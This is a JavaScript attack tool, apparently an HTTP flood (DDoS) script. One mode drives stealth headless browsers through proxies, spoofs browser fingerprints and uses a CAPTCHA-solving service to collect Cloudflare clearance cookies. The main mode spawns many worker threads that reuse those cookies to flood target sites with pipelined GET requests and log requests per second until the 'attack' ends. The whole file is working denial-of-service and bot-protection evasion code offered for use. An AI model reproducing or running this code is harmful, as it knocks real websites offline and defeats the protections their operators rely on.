const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const undici = require('undici');
const os = require('os');
const crypto = require('crypto');

puppeteer.use(StealthPlugin());
puppeteer.use(RecaptchaPlugin({
  provider: { id: '2captcha', token: 'YOUR_2CAPTCHA_API_KEY' },
  visualFeedback: true
}));

if (process.argv.includes('--keymaster')) {
  (async () => {
    const targetsFile = process.argv[3] || 'targets.txt';
    const proxiesFile = process.argv[4] || 'proxies.txt';
    const outputFile = process.argv[5] || 'cookies.json';
    
    const targets = fs.readFileSync(targetsFile, 'utf-8').split('\n').filter(Boolean);
    const proxies = fs.readFileSync(proxiesFile, 'utf-8').split('\n').filter(Boolean);
    
    const results = [];
    
    const mouseMovements = [
      { x: 100, y: 150, duration: 100 },
      { x: 200, y: 180, duration: 150 },
      { x: 300, y: 120, duration: 200 },
      { x: 400, y: 200, duration: 120 },
      { x: 350, y: 250, duration: 180 }
    ];
    
    const scrollPatterns = [
      { x: 0, y: 300, duration: 500 },
      { x: 0, y: 600, duration: 700 },
      { x: 0, y: 400, duration: 400 }
    ];
    
    const typingPatterns = [
      { key: 'h', delay: 120 },
      { key: 'e', delay: 80 },
      { key: 'l', delay: 150 },
      { key: 'l', delay: 90 },
      { key: 'o', delay: 110 }
    ];
    
    for (const target of targets) {
      for (const proxy of proxies) {
        try {
          const proxyParts = proxy.split(':');
          const proxyConfig = {
            host: proxyParts[0],
            port: parseInt(proxyParts[1]),
          };
          
          if (proxyParts.length === 4) {
            proxyConfig.auth = {
              username: proxyParts[2],
              password: proxyParts[3]
            };
          }
          
          const browser = await puppeteer.launch({
            headless: true,
            args: [
              '--no-sandbox',
              '--disable-setuid-sandbox',
              '--disable-dev-shm-usage',
              '--disable-accelerated-2d-canvas',
              '--no-first-run',
              '--no-zygote',
              '--disable-gpu',
              '--single-process',
              '--window-size=1920,1080',
              '--disable-blink-features=AutomationControlled',
              `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
            ]
          });
          
          const page = await browser.newPage();
          
          if (proxyConfig.auth) {
            await page.authenticate(proxyConfig.auth);
          }
          
          const randomUserAgent = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          ][Math.floor(Math.random() * 3)];
          
          await page.setUserAgent(randomUserAgent);
          await page.setViewport({ 
            width: 1920, 
            height: 1080,
            deviceScaleFactor: 1
          });
          
          await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
              get: () => undefined,
            });
            
            Object.defineProperty(navigator, 'plugins', {
              get: () => [
                {
                  0: {type: "application/x-google-chrome-pdf"},
                  description: "Portable Document Format",
                  filename: "internal-pdf-viewer",
                  length: 1,
                  name: "Chrome PDF Plugin"
                },
                {
                  0: {type: "application/x-google-chrome-pdf"},
                  description: "Portable Document Format",
                  filename: "internal-pdf-viewer",
                  length: 1,
                  name: "Chrome PDF Plugin"
                },
                {
                  0: {type: "application/x-google-chrome-pdf"},
                  description: "Portable Document Format",
                  filename: "internal-pdf-viewer",
                  length: 1,
                  name: "Chrome PDF Plugin"
                }
              ],
            });
            
            Object.defineProperty(navigator, 'languages', {
              get: () => ['en-US', 'en'],
            });
            
            Object.defineProperty(navigator, 'hardwareConcurrency', {
              get: () => 4,
            });
            
            Object.defineProperty(navigator, 'deviceMemory', {
              get: () => 8,
            });
            
            window.chrome = {
              app: {
                isInstalled: false,
                installState: 'heuristic',
              },
              webstore: {
                onInstallStageChanged: {},
                onDownloadProgress: {},
              },
              runtime: {
                PlatformOs: {
                  MAC: 'mac',
                  WIN: 'win',
                  ANDROID: 'android',
                  CROS: 'cros',
                  LINUX: 'linux',
                  OPENBSD: 'openbsd',
                },
                PlatformArch: {
                  ARM: 'arm',
                  X86_32: 'x86-32',
                  X86_64: 'x86-64',
                },
                PlatformNaclArch: {
                  ARM: 'arm',
                  X86_32: 'x86-32',
                  X86_64: 'x86-64',
                },
                RequestUpdateCheckStatus: {
                  THROTTLED: 'throttled',
                  NO_UPDATE: 'no_update',
                  UPDATE_AVAILABLE: 'update_available',
                }
              }
            };
            
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
              parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
            );
            
            const getRandomInt = (min, max) => {
              return Math.floor(Math.random() * (max - min + 1)) + min;
            };
            
            const simulateMouseMovement = async () => {
              for (const movement of mouseMovements) {
                await page.mouse.move(
                  movement.x + getRandomInt(-10, 10), 
                  movement.y + getRandomInt(-10, 10), 
                  { steps: getRandomInt(5, 15) }
                );
                await new Promise(resolve => setTimeout(resolve, movement.duration + getRandomInt(-20, 20)));
              }
            };
            
            const simulateScrolling = async () => {
              for (const scroll of scrollPatterns) {
                await page.evaluate((y) => {
                  window.scrollTo({
                    top: y,
                    behavior: 'smooth'
                  });
                }, scroll.y);
                await new Promise(resolve => setTimeout(resolve, scroll.duration));
              }
            };
            
            const simulateTyping = async () => {
              const searchInput = document.querySelector('input[type="search"], input[name="q"], input[placeholder*="Search"]');
              if (searchInput) {
                await searchInput.focus();
                for (const keyPress of typingPatterns) {
                  await page.keyboard.press(keyPress.key, { delay: keyPress.delay });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
                await searchInput.blur();
              }
            };
          });
          
          await page.goto(target, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
          });
          
          await page.evaluate(() => {
            return new Promise(resolve => {
              setTimeout(() => {
                const getRandomInt = (min, max) => {
                  return Math.floor(Math.random() * (max - min + 1)) + min;
                };
                
                const simulateMouseMovement = async () => {
                  for (const movement of mouseMovements) {
                    await window.scrollTo({
                      left: movement.x + getRandomInt(-10, 10),
                      top: movement.y + getRandomInt(-10, 10),
                      behavior: 'smooth'
                    });
                    await new Promise(r => setTimeout(r, movement.duration + getRandomInt(-20, 20)));
                  }
                };
                
                const simulateScrolling = async () => {
                  for (const scroll of scrollPatterns) {
                    window.scrollTo({
                      top: scroll.y,
                      behavior: 'smooth'
                    });
                    await new Promise(r => setTimeout(r, scroll.duration));
                  }
                };
                
                const simulateTyping = async () => {
                  const searchInput = document.querySelector('input[type="search"], input[name="q"], input[placeholder*="Search"]');
                  if (searchInput) {
                    searchInput.focus();
                    for (const keyPress of typingPatterns) {
                      document.dispatchEvent(new KeyboardEvent('keydown', { key: keyPress.key }));
                      await new Promise(r => setTimeout(r, keyPress.delay));
                    }
                    await new Promise(r => setTimeout(r, 1000));
                    searchInput.blur();
                  }
                };
                
                simulateMouseMovement().then(simulateScrolling).then(simulateTyping).then(resolve);
              }, 2000);
            });
          });
          
          await page.waitForTimeout(getRandomInt(1000, 3000));
          
          const cookies = await page.cookies();
          const cfClearance = cookies.find(cookie => cookie.name === 'cf_clearance');
          const cfChlRc = cookies.find(cookie => cookie.name === 'cf_chl_rc');
          const cfChlRcNi = cookies.find(cookie => cookie.name === 'cf_chl_rc_ni');
          
          if (cfClearance || cfChlRc || cfChlRcNi) {
            const userAgent = await page.evaluate(() => navigator.userAgent);
            const viewport = await page.viewport();
            const timezone = await page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone);
            const language = await page.evaluate(() => navigator.language);
            const platform = await page.evaluate(() => navigator.platform);
            
            results.push({
              target,
              proxy,
              cookies,
              userAgent,
              viewport,
              timezone,
              language,
              platform,
              timestamp: Date.now()
            });
            console.log(`[+] Got cookies for ${target} with proxy ${proxy}`);
          }
          
          await browser.close();
        } catch (error) {
          console.log(`[-] Failed for ${target} with proxy ${proxy}: ${error.message}`);
        }
      }
    }
    
    fs.writeFileSync(outputFile, JSON.stringify(results, null, 2));
    console.log(`[+] Saved ${results.length} entries to ${outputFile}`);
    process.exit(0);
  })();
} else if (isMainThread) {
  const cookiesFile = process.argv[2] || 'cookies.json';
  const duration = parseInt(process.argv[3]) || 300;
  const numWorkers = parseInt(process.argv.find(arg => arg.startsWith('--workers='))?.split('=')[1]) || os.cpus().length * 2;
  const batchSize = parseInt(process.argv.find(arg => arg.startsWith('--batch='))?.split('=')[1]) || 50;
  const requestVariation = parseInt(process.argv.find(arg => arg.startsWith('--variation='))?.split('=')[1]) || 30;
  
  const cookies = JSON.parse(fs.readFileSync(cookiesFile, 'utf-8'));
  
  let totalRequests = 0;
  let startTime = Date.now();
  let statsInterval;
  
  const workers = [];
  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker(__filename, {
      workerData: {
        cookies: cookies.filter((_, index) => index % numWorkers === i),
        workerId: i,
        batchSize,
        requestVariation
      }
    });
    
    worker.on('message', (data) => {
      if (data.type === 'stats') {
        totalRequests += data.count;
      }
    });
    
    workers.push(worker);
  }
  
  statsInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = Math.round(totalRequests / elapsed);
    console.log(`[+] RPS: ${rps.toLocaleString()} | Total: ${totalRequests.toLocaleString()} | Workers: ${numWorkers} | Batch: ${batchSize} | Variation: ${requestVariation}% | Elapsed: ${elapsed.toFixed(1)}s`);
  }, 1000);
  
  setTimeout(() => {
    clearInterval(statsInterval);
    console.log(`[+] Attack finished. Total requests: ${totalRequests.toLocaleString()}`);
    workers.forEach(worker => worker.terminate());
    process.exit(0);
  }, duration * 1000);
} else {
  const { cookies, workerId, batchSize, requestVariation } = workerData;
  let requestCount = 0;
  let gcCounter = 0;
  
  const clients = new Map();
  const errorCounts = new Map();
  const requestTimestamps = [];
  
  const getRandomInt = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  };
  
  const getRandomDelay = (baseDelay, variationPercent) => {
    const variation = baseDelay * (variationPercent / 100);
    return baseDelay + getRandomInt(-variation, variation);
  };
  
  const getClient = async (target, proxy, cookies) => {
    const key = `${target}:${proxy}`;
    
    if (!clients.has(key) || errorCounts.get(key) > 10) {
      try {
        const proxyParts = proxy.split(':');
        const dispatcher = new undici.Pool(`http://${target}`, {
          connections: 200,
          pipelining: 100,
          keepAliveMaxTimeout: 60000,
          keepAliveTimeout: 30000,
          proxy: `http://${proxyParts[0]}:${proxyParts[1]}`
        });
        
        if (clients.has(key)) {
          const oldClient = clients.get(key);
          oldClient.destroy();
          clients.delete(key);
        }
        
        clients.set(key, dispatcher);
        errorCounts.set(key, 0);
        return dispatcher;
      } catch (error) {
        errorCounts.set(key, (errorCounts.get(key) || 0) + 1);
        throw error;
      }
    }
    
    return clients.get(key);
  };
  
  const sendRequests = async () => {
    for (const entry of cookies) {
      try {
        const client = await getClient(
          new URL(entry.target).host,
          entry.proxy,
          entry.cookies
        );
        
        const cookieHeader = entry.cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        const baseOptions = {
          method: 'GET',
          headers: {
            'User-Agent': entry.userAgent,
            'Cookie': cookieHeader,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': entry.language || 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
            'Cache-Control': 'max-age=0'
          }
        };
        
        const currentBatchSize = getRandomInt(
          Math.max(1, batchSize - Math.floor(batchSize * 0.3)),
          batchSize + Math.floor(batchSize * 0.3)
        );
        
        const promises = [];
        for (let i = 0; i < currentBatchSize; i++) {
          const options = { ...baseOptions, path: '/' };
          
          if (Math.random() < 0.1) {
            options.path = '/?' + crypto.randomBytes(4).toString('hex');
          }
          
          promises.push(
            client.request(options)
              .then(({ body }) => {
                body.drain().catch(() => {});
                requestCount++;
                gcCounter++;
                
                requestTimestamps.push(Date.now());
                if (requestTimestamps.length > 100) {
                  requestTimestamps.shift();
                }
                
                if (gcCounter >= 10000) {
                  global.gc && global.gc();
                  gcCounter = 0;
                }
                
                if (Math.random() < 0.05) {
                  return new Promise(resolve => setTimeout(resolve, getRandomDelay(100, requestVariation)));
                }
              })
              .catch((error) => {
                const key = `${entry.target}:${entry.proxy}`;
                errorCounts.set(key, (errorCounts.get(key) || 0) + 1);
              })
          );
        }
        
        await Promise.allSettled(promises);
        
        if (requestTimestamps.length > 10) {
          const avgDelay = requestTimestamps.reduce((sum, timestamp, i) => {
            if (i === 0) return 0;
            return sum + (timestamp - requestTimestamps[i-1]);
          }, 0) / (requestTimestamps.length - 1);
          
          if (avgDelay < 5) {
            await new Promise(resolve => setTimeout(resolve, getRandomDelay(50, requestVariation)));
          }
        }
      } catch (error) {
        // Silently ignore errors
      }
    }
    
    setImmediate(sendRequests);
  };
  
  sendRequests();
  
  setInterval(() => {
    parentPort.postMessage({
      type: 'stats',
      count: requestCount
    });
    requestCount = 0;
  }, 1000);
}